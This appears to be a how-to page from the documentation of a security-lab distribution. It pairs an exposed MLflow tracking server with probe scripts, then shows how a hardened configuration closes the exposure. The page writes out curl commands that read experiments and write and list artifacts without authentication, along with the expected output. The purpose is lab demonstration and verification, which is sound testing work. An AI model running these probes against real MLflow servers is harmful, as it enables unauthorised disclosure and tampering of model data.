## Problem

The pairing thesis is Kailash's core idea: deployment + attack in one
declared environment. An MLflow tracking server shipping the
lab-default posture (`services.kailash.mlflow` on `:5000`,
`labReachable`, no auth by declared design) exposes experiment
metadata, run data and model artefacts to anyone who can reach the
port — the manifest maps this to OWASP LLM02 (sensitive information
disclosure) and LLM10 (unrestricted consumption) and to ATLAS
AML.T0049/T0050. You want to demonstrate the exposure against the
declared lab target, then prove the hardened posture closes it — with
both legs reproducible, and a standing CI test asserting the pairing
independent of your lab session.

## Solution

Kailash ships the lab target as a real manifest row (the O-1
service module); the attack instrument is the
**`kailash-integration-mlflow-attack`
probe pair** (`tools/vm-integration-mlflow-attack.sh` in the OS
repo — verbatim MLflow API shapes, live-probed on mlflow 3.x at the
packages pin), driven against the `platform` profile (the posture
`tests/integration-mlflow-attack.nix` boots):

```bash
# 1. Boot the lab target in the documented acceptance posture
#    (the shape from tests/integration-mlflow-attack.nix):
#      services.ollama.host = "0.0.0.0";
#      services.ollama.loadModels = [ "qwen2.5:0.5b" ];
#      services.kailash.mlflow.labReachable = true;
#      kailash.layers.attack.categories.a-07.enable = true;
#    (a qemu user-net VM is an isolated lab segment; see
#     [Boot a verified release image](../getting-started/first-image.html)
#     for the target's build ref)

# 2. In-guest run (the instrument, inside the booted VM):
kailash-integration-mlflow-attack --seed
#    ...or from the host against the qemu hostfwd ports:
kailash-integration-mlflow-attack \
    --mlflow-url http://127.0.0.1:5101 \
    --artifacts-url http://127.0.0.1:5102 --seed
```

What the probe pair does (each stage's verdict prints
ATTEMPTED/ok/FAIL, and every stage's raw response is echoed — never a
fabricated PASS):

```bash
# stage 1 — TRACKING: the O-1 surface is UNAUTHENTICATED:
curl -fsS -X POST http://127.0.0.1:5000/api/2.0/mlflow/experiments/search \
     -H 'Content-Type: application/json' -d '{"max_results":50}'
#    -> 200 JSON with the experiments list, NO credentials presented

# stage 2 — BYPASS, seeded (the full unauthenticated write→read round trip):
curl -fsS -X POST http://127.0.0.1:5000/api/2.0/mlflow/runs/create \
     -H 'Content-Type: application/json' \
     -d '{"experiment_id": "0", "run_name": "MLFLOW_BYPASS_LIST"}'
#    -> .run.info.run_id parsed from the response

curl -fsS -X PUT 'http://127.0.0.1:5000/api/2.0/mlflow-artifacts/artifacts/put?path=0%2F<run-id>%2Fartifacts%2Fka23-listing.txt' \
     -F 'file=@<marker-file>'
#    -> the marker artefact lands through the SAME unauthenticated store

curl -fsS 'http://127.0.0.1:5000/ajax-api/2.0/mlflow/artifacts/list?run_id=<run-id>&path='
#    -> the artefact listing answers; write→read round trip proven
```

Then the verification leg — flip the posture with a configuration
change and re-run the same probes:

```bash
# 3. Harden the lab target in the system configuration:
#      services.kailash.mlflow.labReachable = false;   # loopback-only
#    + the module's auth posture options at the current release
#    (read the module per release — never invented here), then:
sudo nixos-rebuild test

# 4. Re-run the same probe pair, same box:
kailash-integration-mlflow-attack --seed
#    -> both probes FAIL: the auth gate is up; the surface is closed
```

Expected output shape (abridged):

```
== KA-23 integration-mlflow-attack acceptance pair ==
tracking : http://127.0.0.1:5000
artifacts: http://127.0.0.1:5000 (seed: 1)
--- boot-wait: polling http://127.0.0.1:5000/health (window: 300s)
boot-wait: REACHABLE — /health: <body>
--- track: POST /api/2.0/mlflow/experiments/search (UNAUTH)
{"experiments": [...]}
track: ok — experiments/search answered unauthenticated (ML_METHOD_FLAG surface UP)
--- bypass(seed): POST /api/2.0/mlflow/runs/create (UNAUTH)
<create response with run_id>
--- bypass(seed): PUT /api/2.0/mlflow-artifacts/artifacts/put (UNAUTH multipart)
--- bypass: GET /ajax-api/2.0/mlflow/artifacts/list (UNAUTH)
{"files": [...]}
bypass: ok — the artefact listing answered unauthenticated
kailash-integration-mlflow-attack: BOTH probes ok (track + bypass listing)
```

## Discussion

- **Why the probe pair and not a bespoke exploit script:** the
  `mlflow-bypass` manifest row was a PHANTOM — its claimed
  kailash-os upstream repository was never created — and the os#210
  audit (2026-10-14) REMOVED it from the manifest entirely
  ([kailash-os#210](https://github.com/kailash-os/kailash-os/issues/210);
  the name rides the registry there). The probe pair runs the REAL
  protocol against the REAL target — the two verbatim MLflow API
  recipes (unauthenticated tracking search + the `ajax-api` artefact
  listing with the `--seed` write→read round trip) — so the
  acceptance is an executable, honest pairing NOW, with no
  invented tool anywhere. If a real A-7 tool ships later, it enters
  via the os#210 rebuild contract (built upstream first, manifest
  gate second) and takes over.
- **The verdict discipline carries the evidence:** every probe prints
  ATTEMPTED/ok/FAIL (never "PASS") and echoes its verbatim output.
  With `--record`, the verbatims land in a machine-validated JSON
  record (`tests/vm-acceptance-mlflow-record.json`) whose verifier
  leg fails CI on a hand-typed ok with nothing behind it — the same
  no-invented-evidence rule this book runs on.
- **Why the posture flip is the verification:** the lab posture
  (`labReachable = true`) and the hardened posture (loopback/auth
  options at the current pin) are declared options on the SAME
  module. A diff of the two probe runs IS the evidence that a
  configuration change — not folklore — moved the surface; the
  previous generation stays one reboot away (see
  [Ride a release without breaking pinned
  tooling](../admin/updates.html)).
- **CI runs this pairing whether or not you do:** hosted CI evals
  `integration-mlflow-attack.nix` (never boots it — the no-VMs
  posture), and the maintainer's ONE interactive boot is recorded in
  the machine-validated record your `--record` run should match. Your
  lab session reproduces the CI assertion hands-on.
- **The exp gate still owns any future A-7 tool:** a rebuilt A-7
  tool re-enters via the os#210 rebuild contract and installs only
  via the double-key lab gate (full walk:
  [Gate lab-mode and exp-classified
  tools](../admin/lab-mode-gating.html)). The probe pair needs no
  gate — it drives curl/jq/python3 from the base system.
- **Beyond MLflow:** the A-7 platform-exploit pairing is
  aspirational-only right now (every pre-purge A-7 row was
  phantom-upstream and removed — names in the
  [os#210 registry](https://github.com/kailash-os/kailash-os/issues/210)).
  The transferable pattern stays: lab target up → probes run →
  posture flip → same-seed re-run → diff as the evidence.
